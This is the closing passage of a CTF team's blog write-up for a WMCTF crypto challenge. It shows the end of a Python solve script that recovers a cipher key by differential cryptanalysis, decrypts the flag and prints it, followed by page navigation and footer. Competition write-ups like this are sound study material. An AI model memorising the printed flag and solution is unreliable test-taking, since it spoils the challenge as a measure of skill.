</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>c</span><span class=o>.</span><span class=n>most_common</span><span class=p>(</span><span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>key6</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>c</span><span class=o>.</span><span class=n>most_common</span><span class=p>(</span><span class=mi>1</span><span class=p>)[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>key6</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># key6 = [53, 44, 38, 7, 7, 30, 29, 52]</span>
</span></span><span class=line><span class=cl><span class=n>k6</span> <span class=o>=</span> <span class=nb>sum</span><span class=p>(</span><span class=n>key6</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=mi>7</span><span class=o>-</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>6</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># k6 = 236161043654516</span>
</span></span><span class=line><span class=cl><span class=n>keys</span> <span class=o>=</span> <span class=n>inv_keys</span><span class=p>(</span><span class=n>k6</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>keys</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ps</span><span class=p>,</span> <span class=n>cs</span> <span class=o>=</span> <span class=n>pairs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>p1</span><span class=p>,</span> <span class=n>c1</span> <span class=o>=</span> <span class=n>ps</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>cs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>enc_block</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span> <span class=o>==</span> <span class=n>c1</span>
</span></span><span class=line><span class=cl><span class=c1># Ok! key is right!</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># To decrypt, reverse the keys.</span>
</span></span><span class=line><span class=cl><span class=n>keys</span> <span class=o>=</span> <span class=n>keys</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>enc</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>cipher_flag</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=c1># b&#39;WMCTF{D1ff3r3nti@1_w1th_1di0t_B0X3s}\x00\x00\x00\x00&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>WMCTF{D1ff3r3nti@1_w1th_1di0t_B0X3s}</p><div class=blog-tags><a href=https://su-team.cn/tags/wmctf/>WMCTF</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/wmctf-2025-su-wu/>2025 WMCTF SU WriteUp</a></li><li><a href=/post/wmctf-2023-su-wu/>2023 WMCTF SU Write-Up</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/gxzyctf-2020-su-wu/ data-toggle=tooltip data-placement=top title="é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ› 2020 SU Write Up">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/qwb-s4-su-wu/ data-toggle=tooltip data-placement=top title="å¼ºç½‘æ¯ S4 SU Write-Up">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>